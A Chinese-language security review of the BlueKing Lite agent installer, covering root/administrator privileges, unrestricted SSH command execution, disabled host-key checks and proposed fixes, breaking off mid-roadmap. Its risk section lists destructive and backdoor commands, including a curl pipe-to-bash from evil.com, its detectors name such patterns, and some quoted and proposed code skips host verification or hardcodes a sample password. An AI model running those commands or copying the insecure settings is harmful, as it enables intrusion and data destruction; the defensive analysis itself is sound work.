# BlueKing Lite 探针安装权限与安全分析

## 文档信息
- **创建日期**: 2025-10-20
- **分析目的**: 评估 BlueKing Lite 探针安装过程中的权限需求和安全风险
- **研究范围**: Windows/Linux 探针安装机制、权限要求、安全隐患及改进方案

---

## 一、探针安装权限需求分析

### 1.1 Windows 探针权限需求

#### 硬性要求管理员权限的原因

**代码位置**: `server/apps/node_mgmt/constants/controller.py:40-44`

```python
NodeConstants.WINDOWS_OS: (
    "powershell -command "
    "\"Set-ExecutionPolicy Unrestricted -Force; & "
    "'{}\\install.ps1' -ServerUrl {} -ServerToken {} -Cloud {} -Group {} -NodeName {} -NodeId {}\""
)
```

**必须管理员权限的操作：**

1. **修改 PowerShell 执行策略**
   ```powershell
   Set-ExecutionPolicy Unrestricted -Force
   ```
   - 此命令**必须**以管理员身份运行
   - 用途：允许执行未签名的 PowerShell 脚本
   - 影响范围：系统级策略修改

2. **写入系统目录**
   ```python
   # 安装目录配置
   CONTROLLER_INSTALL_DIR = {
       "windows": {
           "storage_dir": "/tmp",
           "install_dir": "C:\\gse"  # 系统级目录
       }
   }
   ```
   - 默认安装路径：`C:\gse` 或 `C:\bklite`
   - 需要对系统盘根目录的写入权限

3. **可能的 Windows 服务注册**
   - 如果探针作为 Windows 服务运行，需要注册到 SCM（服务控制管理器）
   - 服务注册和管理需要管理员权限

### 1.2 Linux 探针权限需求

#### Root 权限检查

**代码位置**: `agents/fusion-collector/misc/install.sh:21-27`

```bash
# 检查root权限
check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo "错误: 请使用 root 权限运行此脚本"
        exit 1
    fi
}
```

#### 必须 Root 权限的操作

**1. 安装前清理和文件移动**

**代码位置**: `server/apps/node_mgmt/constants/controller.py:32-38`

```bash
sudo rm -rf /opt/fusion-collectors
sudo mv /tmp/fusion-collectors /opt/fusion-collectors
sudo chmod -R +x /opt/fusion-collectors/*
cd /opt/fusion-collectors
sudo bash ./install.sh ...
```

**2. Systemd 服务管理**

**代码位置**: `agents/fusion-collector/misc/install.sh:46-49`

```bash
# 拷贝服务文件并启用
cp -f "./sidecar.service" /etc/systemd/system/
systemctl daemon-reload
systemctl enable --now sidecar.service
```

- 写入 `/etc/systemd/system/` 需要 root 权限
- `systemctl` 操作系统服务需要 root 权限

**3. 服务以 Root 身份运行**

**代码位置**: `agents/fusion-collector/misc/sidecar.service:8-9`

```ini
[Service]
User=root      # ⚠️ 服务以 root 用户运行
Group=root
```

---

## 二、安全隐患分析

### 2.1 ⚠️ 高危风险点

#### 风险 1: 探针以最高权限运行

**影响范围**: 系统级

- **Linux**: 服务以 `root` 用户身份运行
- **Windows**: 可能以 `SYSTEM` 或 Administrator 运行
- **风险等级**: 🔴 高危
- **攻击场景**:
  - 探针程序存在漏洞被利用
  - 配置文件被恶意修改
  - 进程被注入恶意代码
  - **后果**: 攻击者获得系统完全控制权

#### 风险 2: 无限制的远程命令执行能力

**代码位置**: `agents/nats-executor/ssh/executor.go`

```go
func Execute(req ExecuteRequest, instanceId string) ExecuteResponse {
    // 可以执行任意命令，无白名单限制
    client := goph.NewConn(&goph.Config{
        User:     username,
        Addr:     host,
        Port:     port,
        Auth:     goph.Password(password),
    })

    output, err := client.RunContext(ctx, command)  // ⚠️ 无过滤
}
```

**风险等级**: 🔴 高危

**攻击场景**:
1. NATS 消息总线被攻破
2. 服务器端管理员账户被窃取
3. 内部恶意用户滥用权限

**可能的恶意操作**:
```bash
# 攻击者可以执行的命令示例
rm -rf /                          # 删除系统文件
cat /etc/shadow                   # 窃取密码哈希
curl http://evil.com/backdoor.sh | bash  # 植入后门
```

#### 风险 3: SSH 凭证安全问题

**代码位置**: `server/apps/node_mgmt/services/installer.py:34-44`

```python
aes_obj = AESCryptor()
for node in nodes:
    creates.append(ControllerTaskNode(
        ...
        password=aes_obj.encode(node["password"]),  # AES 加密
        ...
    ))
```

**风险点**:
1. **密码在 NATS 消息中传输**
   - 虽然可以配置 TLS，但默认配置可能未启用
   - 服务器端攻击者仍可截获消息

2. **AES 密钥管理**
   - 密钥存储位置：Django `SECRET_KEY`
   - 如果 `SECRET_KEY` 泄露，所有加密密码可被解密

3. **密码清理时机**
   - 代码位置: `server/apps/node_mgmt/tasks/installer.py`
   - 安装完成后清除，但窗口期内仍存在风险

#### 风险 4: SSH 主机密钥验证被禁用

**代码位置**: `agents/nats-executor/ssh/executor.go`

```go
Callback: ssh.InsecureIgnoreHostKey()  // ⚠️ 跳过主机身份验证
```

**SCP 文件传输**:
```bash
sshpass -p 'password' scp -o StrictHostKeyChecking=no \
    -P {port} -r {source} {user}@{host}:{target}
```

**风险等级**: 🟡 中危

**攻击场景**: 中间人攻击（MITM）
- 攻击者可以伪装成目标主机
- 截获 SSH 连接和传输的数据
- 窃取凭证和敏感信息

#### 风险 5: PowerShell 执行策略过于宽松

**代码位置**: `server/apps/node_mgmt/constants/controller.py:42`

```powershell
Set-ExecutionPolicy Unrestricted -Force
```

**风险等级**: 🟡 中危

**影响**:
- 允许运行任何未签名的 PowerShell 脚本
- 降低了 Windows 系统的整体安全基线
- 可能被其他恶意软件利用

**最佳实践对比**:
| 策略级别 | 安全性 | 当前使用 |
|---------|-------|---------|
| Restricted | 最高 | ❌ |
| AllSigned | 高 | ❌ |
| RemoteSigned | 中 | ❌ |
| Unrestricted | **低** | ✅ 当前 |

### 2.2 风险汇总表

| 风险项 | 等级 | 影响范围 | 利用难度 | 优先级 |
|-------|------|---------|---------|--------|
| 探针以最高权限运行 | 🔴 高危 | 系统级 | 中 | P0 |
| 无限制命令执行 | 🔴 高危 | 所有节点 | 中 | P0 |
| SSH 主机验证禁用 | 🟡 中危 | 网络通信 | 高 | P0 |
| PowerShell 策略宽松 | 🟡 中危 | Windows 节点 | 低 | P1 |
| 凭证传输安全 | 🟡 中危 | 所有节点 | 高 | P1 |

---

## 三、业界最佳实践对比

### 3.1 主流运维平台权限策略

| 平台 | 探针运行权限 | 权限管理策略 | 安全特性 |
|------|------------|------------|---------|
| **Ansible** | SSH 用户权限 | 按需提权（become机制）| 命令审计、角色隔离 |
| **SaltStack** | Minion 以 root 运行 | ACL 限制可执行模块 | 模块白名单、加密通信 |
| **Puppet** | 专用用户运行 | 基于角色的访问控制 | 证书认证、审计日志 |
| **Zabbix Agent** | 普通用户 + sudo | sudo 白名单机制 | 只读监控、命令限制 |
| **Prometheus Node Exporter** | 普通用户 | 无执行权限 | 纯指标采集、零信任 |
| **DataDog Agent** | 专用用户 | Capabilities 授权 | 最小权限、沙箱隔离 |

### 3.2 权限模型对比

#### 模型 1: 全权限模型（当前 BKLite）

```
探针进程
  ├─ 运行用户: root/Administrator
  ├─ 权限范围: 系统全部权限
  └─ 限制机制: 无
```

**优点**: 实现简单，功能无限制
**缺点**: 安全风险极高

#### 模型 2: 最小权限模型（推荐）

```
探针进程
  ├─ 运行用户: bklite (专用普通用户)
  ├─ 权限范围:
  │   ├─ Capabilities: CAP_NET_BIND_SERVICE, CAP_SYS_PTRACE
  │   └─ sudo 白名单: 仅监控相关命令
  └─ 限制机制: SELinux/AppArmor 强制访问控制
```

**优点**: 安全性高，符合最小权限原则
**缺点**: 配置复杂度增加

#### 模型 3: 混合模型（过渡方案）

```
探针进程
  ├─ 基础进程: 普通用户运行
  ├─ 特权操作: 通过 helper 程序 (setuid)
  └─ 命令执行: 白名单 + sudo
```

**优点**: 平衡安全性和兼容性
**缺点**: 需要重构部分代码

---

## 四、安全改进方案

### 方案 1: 最小权限原则实施（推荐）

#### 4.1.1 Linux 环境改进

**步骤 1: 创建专用用户**

```bash
# 创建 bklite 系统用户
useradd -r -s /sbin/nologin -d /opt/fusion-collectors bklite

# 设置目录权限
chown -R bklite:bklite /opt/fusion-collectors
chmod 750 /opt/fusion-collectors
```

**步骤 2: 修改 Systemd 服务配置**

```ini
# /etc/systemd/system/sidecar.service
[Unit]
Description=Fusion Collector Sidecar
After=network.target

[Service]
Type=simple
ExecStart=/opt/fusion-collectors/collector-sidecar -c /opt/fusion-collectors/sidecar.yml

# ✅ 改进：使用专用用户
User=bklite
Group=bklite

# ✅ 改进：通过 Capabilities 授予特定权限
AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH
CapabilityBoundingSet=CAP_NET_BIND_SERVICE CAP_SYS_PTRACE CAP_DAC_READ_SEARCH

# ✅ 改进：限制文件系统访问
ReadOnlyPaths=/etc /usr
ReadWritePaths=/opt/fusion-collectors /var/log/bklite
PrivateTmp=yes

# ✅ 改进：禁止提权
NoNewPrivileges=yes

# ✅ 改进：系统调用过滤（可选）
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources

Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
```

**步骤 3: 配置 sudo 白名单**

```bash
# /etc/sudoers.d/bklite
# 只允许特定的监控命令
bklite ALL=(ALL) NOPASSWD: /usr/bin/systemctl status *
bklite ALL=(ALL) NOPASSWD: /usr/bin/systemctl is-active *
bklite ALL=(ALL) NOPASSWD: /usr/bin/netstat -tuln
bklite ALL=(ALL) NOPASSWD: /usr/bin/ss -tuln
bklite ALL=(ALL) NOPASSWD: /usr/bin/ps aux
bklite ALL=(ALL) NOPASSWD: /usr/sbin/iptables -L -n
bklite ALL=(ALL) NOPASSWD: /usr/bin/df -h
bklite ALL=(ALL) NOPASSWD: /usr/bin/du -sh *

# 禁止其他所有命令
```

**Capabilities 说明**:
- `CAP_NET_BIND_SERVICE`: 绑定小于 1024 的特权端口
- `CAP_SYS_PTRACE`: 读取其他进程信息（监控需要）
- `CAP_DAC_READ_SEARCH`: 读取受保护的文件（如 /proc）

#### 4.1.2 Windows 环境改进

**步骤 1: 创建专用服务账户**

```powershell
# 创建本地服务账户
$Password = ConvertTo-SecureString "ComplexP@ssw0rd!" -AsPlainText -Force
New-LocalUser -Name "BKLiteService" -Password $Password -Description "BlueKing Lite Service Account"

# 授予特定权限（通过组策略）
Add-LocalGroupMember -Group "Performance Monitor Users" -Member "BKLiteService"
Add-LocalGroupMember -Group "Event Log Readers" -Member "BKLiteService"
```

**步骤 2: 修改执行策略**

```powershell
# ❌ 当前做法（不安全）
Set-ExecutionPolicy Unrestricted -Force

# ✅ 改进做法
Set-ExecutionPolicy RemoteSigned -Force
# 然后对安装脚本进行代码签名
```

**步骤 3: 脚本签名流程**

```powershell
# 1. 创建自签名证书（生产环境应使用CA颁发的证书）
$cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=BKLite Code Signing"

# 2. 导出证书到受信任的发布者
Export-Certificate -Cert $cert -FilePath BKLite.cer
Import-Certificate -FilePath BKLite.cer -CertStoreLocation Cert:\LocalMachine\TrustedPublisher

# 3. 签名脚本
Set-AuthenticodeSignature -FilePath install.ps1 -Certificate $cert
```

**步骤 4: 使用 NSSM 注册服务（非管理员运行）**

```powershell
# 安装 NSSM (Non-Sucking Service Manager)
# 以受限用户身份运行服务
nssm install BKLiteCollector "C:\bklite\collector-sidecar.exe"
nssm set BKLiteCollector ObjectName ".\BKLiteService" "ComplexP@ssw0rd!"
nssm set BKLiteCollector AppDirectory "C:\bklite"
```

### 方案 2: 命令白名单机制

#### 4.2.1 NATS Executor 命令验证

**代码位置**: 需要修改 `agents/nats-executor/ssh/executor.go`

```go
package ssh

import (
    "regexp"
    "strings"
)

// 命令白名单配置
type CommandWhitelist struct {
    AllowedPatterns []string
    BlockedPatterns []string
}

var defaultWhitelist = CommandWhitelist{
    AllowedPatterns: []string{
        // 系统信息查询
        `^systemctl status [\w\-]+$`,
        `^systemctl is-active [\w\-]+$`,
        `^ps aux$`,
        `^ps -ef$`,

        // 网络状态
        `^netstat -tuln$`,
        `^ss -tuln$`,
        `^ip addr show$`,

        // 磁盘和文件系统
        `^df -h$`,
        `^du -sh .+$`,
        `^ls -la .+$`,

        // 日志查看（限制行数）
        `^tail -n \d{1,4} .+\.log$`,
        `^journalctl -u [\w\-]+ -n \d{1,4}$`,

        // 包管理（只读操作）
        `^rpm -qa$`,
        `^dpkg -l$`,
    },

    BlockedPatterns: []string{
        // 危险命令
        `rm\s+-rf`,
        `mkfs`,
        `dd\s+if=`,
        `>\s*/dev/`,

        // 网络攻击
        `wget`,
        `curl.*\|.*bash`,

        // 提权尝试
        `sudo\s+su`,
        `passwd`,
        `useradd`,
        `usermod`,
    },
}

// 验证命令是否允许执行
func (w *CommandWhitelist) IsAllowed(command string) (bool, string) {
    cmd := strings.TrimSpace(command)

    // 1. 先检查黑名单
    for _, pattern := range w.BlockedPatterns {
        if matched, _ := regexp.MatchString(pattern, cmd); matched {
            return false, "Command matches blocked pattern: " + pattern
        }
    }

    // 2. 检查白名单
    for _, pattern := range w.AllowedPatterns {
        if matched, _ := regexp.MatchString(pattern, cmd); matched {
            return true, ""
        }
    }

    // 3. 默认拒绝
    return false, "Command not in whitelist"
}

// 修改 Execute 函数
func Execute(req ExecuteRequest, instanceId string) ExecuteResponse {
    // ✅ 添加命令验证
    allowed, reason := defaultWhitelist.IsAllowed(req.Command)
    if !allowed {
        return ExecuteResponse{
            InstanceId: instanceId,
            Success:    false,
            Error:      "Command rejected: " + reason,
            Output:     "",
        }
    }

    // 原有的执行逻辑
    client := goph.NewConn(&goph.Config{
        User:     req.Username,
        Addr:     req.Host,
        Port:     req.Port,
        Auth:     goph.Password(req.Password),
        Timeout:  30 * time.Second,
        Callback: ssh.InsecureIgnoreHostKey(),  // 这个也应该修复
    })

    // ... 执行命令
}
```

#### 4.2.2 动态白名单管理

**数据库模型**: 新增 `CommandWhitelist` 表

```python
# server/apps/node_mgmt/models/security.py

class CommandWhitelist(models.Model):
    """命令白名单管理"""

    pattern = models.CharField(max_length=500, help_text="命令正则表达式")
    type = models.CharField(
        max_length=20,
        choices=[('allow', '允许'), ('deny', '拒绝')],
        default='allow'
    )
    description = models.TextField(help_text="用途说明")
    enabled = models.BooleanField(default=True)
    cloud_region = models.ForeignKey(
        'CloudRegion',
        null=True,
        blank=True,
        help_text="特定区域规则，为空表示全局"
    )
    created_at = models.DateTimeField(auto_now_add=True)
    updated_by = models.CharField(max_length=100)

    class Meta:
        db_table = 'node_mgmt_command_whitelist'

    def __str__(self):
        return f"{self.type}: {self.pattern}"
```

### 方案 3: 基于证书的认证

#### 4.3.1 替代密码认证

**问题**: 当前使用 SSH 密码认证，存在：
- 密码传输风险
- 密码存储风险
- 暴力破解风险

**改进**: 使用 SSH 密钥对认证

```python
# server/apps/node_mgmt/models/installer.py

class ControllerTaskNode(models.Model):
    # ❌ 当前字段
    password = models.CharField(max_length=500)  # AES加密的密码

    # ✅ 改进字段
    auth_type = models.CharField(
        max_length=20,
        choices=[
            ('password', '密码'),
            ('ssh_key', 'SSH密钥'),
            ('temp_token', '临时令牌'),
        ],
        default='ssh_key'
    )
    ssh_private_key = models.TextField(null=True, blank=True)  # 临时私钥
    ssh_public_key = models.TextField(null=True, blank=True)   # 公钥
    temp_token = models.CharField(max_length=200, null=True)   # 短期token
    token_expires_at = models.DateTimeField(null=True)         # token过期时间
```

**实施流程**:

```python
# server/apps/node_mgmt/services/installer.py

import paramiko
from datetime import datetime, timedelta

def install_controller_with_sshkey(cloud_region_id, work_node, package_version_id, nodes):
    """使用SSH密钥安装控制器"""

    for node in nodes:
        # 1. 生成临时密钥对
        key = paramiko.RSAKey.generate(2048)
        private_key = key.get_base64()
        public_key = f"ssh-rsa {key.get_base64()} bklite-installer"

        # 2. 将公钥部署到目标节点
        # （需要先用密码登录一次，然后添加公钥到 authorized_keys）
        deploy_ssh_key(
            host=node['ip'],
            username=node['username'],
            password=node['password'],  # 仅用于首次部署公钥
            public_key=public_key
        )

        # 3. 后续操作使用私钥认证
        task_node = ControllerTaskNode.objects.create(
            auth_type='ssh_key',
            ssh_private_key=encrypt_private_key(private_key),  # 加密存储
            ssh_public_key=public_key,
            # 密码字段留空或设置为None
            password=None,
        )

        # 4. 安装完成后删除公钥（可选，增强安全性）
        cleanup_ssh_key(node['ip'], public_key)

def deploy_ssh_key(host, username, password, public_key):
    """部署SSH公钥到目标节点"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=username, password=password)

    # 添加公钥到 authorized_keys
    commands = [
        "mkdir -p ~/.ssh",
        "chmod 700 ~/.ssh",
        f"echo '{public_key}' >> ~/.ssh/authorized_keys",
        "chmod 600 ~/.ssh/authorized_keys",
    ]

    for cmd in commands:
        stdin, stdout, stderr = ssh.exec_command(cmd)
        stdout.read()

    ssh.close()
```

#### 4.3.2 短期访问令牌（临时凭证）

```python
# server/apps/node_mgmt/utils/temp_token.py

import jwt
from datetime import datetime, timedelta

def generate_temp_access_token(node_id, ip, validity_minutes=30):
    """生成短期访问令牌"""
    payload = {
        'node_id': node_id,
        'ip': ip,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(minutes=validity_minutes),
        'purpose': 'controller_installation',
    }

    token = jwt.encode(payload, settings.SECRET_KEY, algorithm='HS256')
    return token

def verify_temp_access_token(token):
    """验证令牌有效性"""
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=['HS256'])
        return True, payload
    except jwt.ExpiredSignatureError:
        return False, "Token expired"
    except jwt.InvalidTokenError:
        return False, "Invalid token"
```

### 方案 4: 审计和监控

#### 4.4.1 命令执行审计日志

**数据库模型**:

```python
# server/apps/node_mgmt/models/audit.py

class CommandAuditLog(models.Model):
    """命令执行审计日志"""

    id = models.BigAutoField(primary_key=True)

    # 执行上下文
    node_id = models.CharField(max_length=100, db_index=True)
    node_ip = models.GenericIPAddressField()
    executor_user = models.CharField(max_length=100)  # 操作用户
    executor_instance = models.CharField(max_length=100)  # NATS executor ID

    # 命令信息
    command = models.TextField()  # 完整命令
    command_hash = models.CharField(max_length=64)  # SHA256 哈希
    command_type = models.CharField(max_length=50)  # 分类: install/monitor/exec

    # 执行结果
    success = models.BooleanField()
    exit_code = models.IntegerField(null=True)
    output_preview = models.TextField(max_length=1000)  # 输出前1000字符
    output_hash = models.CharField(max_length=64)  # 完整输出的哈希
    error_message = models.TextField(null=True, blank=True)

    # 时间戳
    started_at = models.DateTimeField(auto_now_add=True)
    finished_at = models.DateTimeField(null=True)
    duration_ms = models.IntegerField(null=True)  # 执行时长（毫秒）

    # 安全标记
    is_suspicious = models.BooleanField(default=False)  # 可疑操作标记
    risk_level = models.CharField(
        max_length=20,
        choices=[
            ('low', '低'),
            ('medium', '中'),
            ('high', '高'),
            ('critical', '严重'),
        ],
        default='low'
    )

    class Meta:
        db_table = 'node_mgmt_command_audit_log'
        indexes = [
            models.Index(fields=['node_id', '-started_at']),
            models.Index(fields=['executor_user', '-started_at']),
            models.Index(fields=['is_suspicious', 'risk_level']),
        ]
```

**集成到执行流程**:

```python
# server/apps/rpc/executor.py

import hashlib
from apps.node_mgmt.models.audit import CommandAuditLog

class Executor:
    def execute_ssh(self, command, host, port, username, password, timeout=600):
        """执行SSH命令（增强审计版本）"""

        # 1. 记录审计日志（开始）
        audit_log = CommandAuditLog.objects.create(
            node_id=self.get_node_id_by_ip(host),
            node_ip=host,
            executor_user=username,
            executor_instance=self.instance_id,
            command=command,
            command_hash=hashlib.sha256(command.encode()).hexdigest(),
            command_type='ssh_exec',
            started_at=datetime.now(),
        )

        try:
            # 2. 执行命令（原有逻辑）
            result = self.rpc_client.run(
                f"ssh.execute.{self.instance_id}",
                "Execute",
                command, host, port, username, password, timeout
            )

            # 3. 更新审计日志（成功）
            audit_log.success = True
            audit_log.exit_code = result.get('exit_code', 0)
            audit_log.output_preview = result.get('output', '')[:1000]
            audit_log.output_hash = hashlib.sha256(
                result.get('output', '').encode()
            ).hexdigest()
            audit_log.finished_at = datetime.now()
            audit_log.duration_ms = int(
                (audit_log.finished_at - audit_log.started_at).total_seconds() * 1000
            )

            # 4. 安全分析
            audit_log.is_suspicious = self._analyze_suspicious_activity(
                command, result.get('output', '')
            )
            audit_log.risk_level = self._calculate_risk_level(command)

            audit_log.save()

            return result

        except Exception as e:
            # 5. 更新审计日志（失败）
            audit_log.success = False
            audit_log.error_message = str(e)
            audit_log.finished_at = datetime.now()
            audit_log.is_suspicious = True  # 失败也标记为可疑
            audit_log.risk_level = 'high'
            audit_log.save()

            raise

    def _analyze_suspicious_activity(self, command, output):
        """分析可疑活动"""
        suspicious_patterns = [
            'rm -rf /',
            '/etc/shadow',
            '/etc/passwd',
            'wget.*\|.*bash',
            'curl.*\|.*sh',
            'nc -l',  # netcat 监听
            'chmod 777',
            'iptables -F',
        ]

        for pattern in suspicious_patterns:
            if pattern in command.lower():
                return True

        return False

    def _calculate_risk_level(self, command):
        """计算风险等级"""
        if any(p in command.lower() for p in ['rm -rf', 'mkfs', 'dd if=']):
            return 'critical'
        elif any(p in command.lower() for p in ['chmod', 'chown', 'passwd']):
            return 'high'
        elif any(p in command.lower() for p in ['systemctl stop', 'systemctl restart']):
            return 'medium'
        else:
            return 'low'
```

#### 4.4.2 实时告警

```python
# server/apps/node_mgmt/services/security_monitor.py

from django.core.cache import cache
from apps.alerts.models import Alert

class SecurityMonitor:
    """安全监控服务"""

    @staticmethod
    def check_suspicious_command(audit_log):
        """检查可疑命令并告警"""

        if audit_log.is_suspicious or audit_log.risk_level in ['high', 'critical']:
            # 创建告警
            Alert.objects.create(
                severity='critical',
                title=f'检测到高风险命令执行: {audit_log.node_ip}',
                message=f"""
                节点: {audit_log.node_ip}
                执行用户: {audit_log.executor_user}
                命令: {audit_log.command}
                风险等级: {audit_log.risk_level}
                时间: {audit_log.started_at}
                """,
                source='security_monitor',
            )

            # 发送通知（邮件/钉钉/企业微信）
            send_security_alert(audit_log)

    @staticmethod
    def detect_anomaly(node_id):
        """异常行为检测"""

        # 1. 检测短时间内大量命令执行
        cache_key = f'cmd_count_{node_id}'
        count = cache.get(cache_key, 0)
        cache.set(cache_key, count + 1, timeout=60)  # 1分钟窗口

        if count > 50:  # 1分钟内超过50条命令
            Alert.objects.create(
                severity='warning',
                title=f'检测到异常命令频率: {node_id}',
                message=f'节点 {node_id} 在1分钟内执行了 {count} 条命令',
                source='anomaly_detection',
            )

        # 2. 检测失败登录尝试
        recent_failures = CommandAuditLog.objects.filter(
            node_id=node_id,
            success=False,
            started_at__gte=datetime.now() - timedelta(minutes=5)
        ).count()

        if recent_failures > 5:
            Alert.objects.create(
                severity='critical',
                title=f'检测到多次失败尝试: {node_id}',
                message=f'节点 {node_id} 在5分钟内有 {recent_failures} 次失败尝试',
                source='brute_force_detection',
            )
```

### 方案 5: 网络隔离和加密

#### 4.5.1 启用双向 TLS 认证

**NATS 服务器配置**: `deploy/docker-compose/conf/nats.conf`

```conf
# NATS Server TLS Configuration

# 监听地址
listen: 0.0.0.0:4222

# TLS 配置
tls {
    # 服务器证书和私钥
    cert_file: "/etc/nats/certs/server-cert.pem"
    key_file:  "/etc/nats/certs/server-key.pem"

    # CA 证书（用于验证客户端）
    ca_file:   "/etc/nats/certs/ca-cert.pem"

    # 要求客户端提供证书（双向认证）
    verify:    true

    # 证书验证深度
    verify_depth: 2

    # 超时设置
    timeout: 5
}

# 认证配置
authorization {
    users = [
        {
            user: "bklite_server"
            password: "$2a$11$..."  # bcrypt 哈希密码
            permissions: {
                publish: ["ssh.execute.>", "download.>", "upload.>"]
                subscribe: ["_INBOX.>"]
            }
        },
        {
            user: "bklite_executor"
            password: "$2a$11$..."
            permissions: {
                subscribe: ["ssh.execute.>", "download.>", "upload.>"]
                publish: ["_INBOX.>"]
            }
        }
    ]
}
```

**NATS Executor 配置**: `agents/nats-executor/config.yaml`

```yaml
# NATS连接配置
nats_urls: "tls://nats-server:4222"
nats_instanceId: "${node.id}"
nats_conn_timeout: 600

# TLS 配置
tls_enabled: true
tls_skip_verify: false  # ✅ 修复：不跳过证书验证
tls_client_cert: "/etc/bklite/certs/client-cert.pem"
tls_client_key: "/etc/bklite/certs/client-key.pem"
tls_ca_file: "/etc/bklite/certs/ca-cert.pem"

# 认证
nats_username: "bklite_executor"
nats_password: "${NATS_PASSWORD}"  # 从环境变量读取
```

#### 4.5.2 启用 SSH 主机密钥验证

**修改 NATS Executor**: `agents/nats-executor/ssh/executor.go`

```go
package ssh

import (
    "golang.org/x/crypto/ssh"
    "golang.org/x/crypto/ssh/knownhosts"
)

// ✅ 改进：使用 known_hosts 验证
func Execute(req ExecuteRequest, instanceId string) ExecuteResponse {
    // 1. 加载 known_hosts
    hostKeyCallback, err := knownhosts.New("/opt/bklite/.ssh/known_hosts")
    if err != nil {
        return ExecuteResponse{
            Success: false,
            Error:   "Failed to load known_hosts: " + err.Error(),
        }
    }

    // 2. 创建 SSH 客户端配置
    client, err := goph.NewConn(&goph.Config{
        User:     req.Username,
        Addr:     req.Host,
        Port:     req.Port,
        Auth:     goph.Password(req.Password),
        Timeout:  30 * time.Second,
        Callback: hostKeyCallback,  // ✅ 使用真实的验证
    })

    if err != nil {
        return ExecuteResponse{
            Success: false,
            Error:   "SSH connection failed: " + err.Error(),
        }
    }
    defer client.Close()

    // 3. 执行命令
    ctx, cancel := context.WithTimeout(context.Background(), req.Timeout)
    defer cancel()

    output, err := client.RunContext(ctx, req.Command)

    return ExecuteResponse{
        InstanceId: instanceId,
        Success:    err == nil,
        Output:     string(output),
        Error:      getErrorMessage(err),
    }
}

// 首次连接时添加主机密钥
func TrustHost(host string, port uint, publicKey ssh.PublicKey) error {
    knownHostsFile := "/opt/bklite/.ssh/known_hosts"

    // 格式: [host]:port ssh-rsa AAAA...
    entry := knownhosts.Line([]string{
        fmt.Sprintf("[%s]:%d", host, port),
    }, publicKey)

    // 追加到 known_hosts
    f, err := os.OpenFile(knownHostsFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
    if err != nil {
        return err
    }
    defer f.Close()

    _, err = f.WriteString(entry + "\n")
    return err
}
```

#### 4.5.3 网络分段架构

```
┌─────────────────────────────────────────────────────────────┐
│                      管理区 (DMZ)                            │
│  ┌──────────────┐         ┌──────────────┐                 │
│  │  BKLite Web  │────────►│ BKLite API   │                 │
│  │  (Frontend)  │         │  (Django)    │                 │
│  └──────────────┘         └───────┬──────┘                 │
│                                    │                         │
│                            ┌───────▼──────┐                 │
│                            │ NATS Gateway │                 │
│                            │ (TLS Proxy)  │                 │
│                            └───────┬──────┘                 │
└────────────────────────────────────┼────────────────────────┘
                                     │ TLS + mTLS
                                     │ (双向认证)
┌────────────────────────────────────┼────────────────────────┐
│                      生产区 (隔离网络)                        │
│                            ┌───────▼──────┐                 │
│                            │  NATS Server │                 │
│                            └───────┬──────┘                 │
│                                    │                         │
│          ┌─────────────────────────┼─────────────────┐      │
│          │                         │                  │      │
│    ┌─────▼──────┐          ┌──────▼─────┐    ┌──────▼────┐│
│    │ Executor 1 │          │ Executor 2 │    │ Executor N││
│    │ (Node A)   │          │ (Node B)   │    │ (Node X)  ││
│    └────────────┘          └────────────┘    └───────────┘│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**防火墙规则**:

```bash
# 服务器端（只允许出站到NATS）
iptables -A OUTPUT -p tcp -d <NATS_IP> --dport 4222 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p tcp -s <NATS_IP> --sport 4222 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp -j DROP  # 默认拒绝其他出站

# Agent端（只允许连接NATS和被动接受SSH）
iptables -A OUTPUT -p tcp -d <NATS_IP> --dport 4222 -j ACCEPT
iptables -A INPUT -p tcp -s <TRUSTED_IP> --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP  # 拒绝其他SSH连接
```

---

## 五、实施优先级和路线图

### 5.1 优先级矩阵

| 改进项 | 安全收益 | 实施难度 | 优先级 | 时间估算 |
|-------|---------|---------|--------|---------|
| 启用 SSH 主机密钥验证 | 高 | 低 | **P0** | 2天 |
| NATS 双向 TLS 认证 | 高 | 中 | **P0** | 3天 |
| 命令执行审计日志 | 高 | 低 | **P0** | 3天 |
| 限制 PowerShell 执行策略 | 中 | 低 | **P0** | 1天 |
| 命令白名单机制 | 高 | 中 | **P1** | 5天 |
| 创建非root用户运行探针(Linux) | 高 | 高 | **P1** | 7天 |
| Windows 专用服务账户 | 高 | 高 | **P1** | 7天 |
| 实施 RBAC 权限控制 | 中 | 中 | **P1** | 5天 |
| SSH 密钥认证替代密码 | 高 | 高 | **P2** | 10天 |
| 网络分段和防火墙 | 中 | 高 | **P2** | 14天 |
| 安全审计和渗透测试 | 低 | 中 | **P2** | 持续 |

### 5.2 实施路线图

#### 第一阶段：紧急修复（P0）- 1-2周

**目标**: 修复最严重的安全漏洞

**任务清单**:
- ✅ 修改 `agents/nats-executor/ssh/executor.go`
  - 启用 SSH 主机密钥验证
  - 使用 `knownhosts.New()` 替代 `InsecureIgnoreHostKey()`

- ✅ 配置 NATS TLS
  - 生成 CA 证书和服务器/客户端证书
  - 修改 NATS 服务器配置启用 TLS
  - 修改 executor 配置使用证书连接

- ✅ 添加审计日志
  - 创建 `CommandAuditLog` 模型和迁移
  - 在 `Executor` 类中集成审计逻辑
  - 实现基础的可疑活动检测

- ✅ 修改 Windows 安装脚本
  - 将 `Unrestricted` 改为 `RemoteSigned`
  - 实施脚本签名流程

**验收标准**:
- 所有 SSH 连接都验证主机密钥
- NATS 通信全程加密（TLS）
- 每条命令执行都有审计记录
- Windows 不再使用 `Unrestricted` 策略

#### 第二阶段：安全加固（P1）- 4-6周

**目标**: 实施最小权限原则和访问控制

**任务清单**:
- ✅ 命令白名单
  - 定义允许的命令正则表达式列表
  - 在 executor 中实现验证逻辑
  - 创建管理界面支持动态配置

- ✅ Linux 降权运行
  - 修改 systemd service 使用 `bklite` 用户
  - 配置 Capabilities 授权
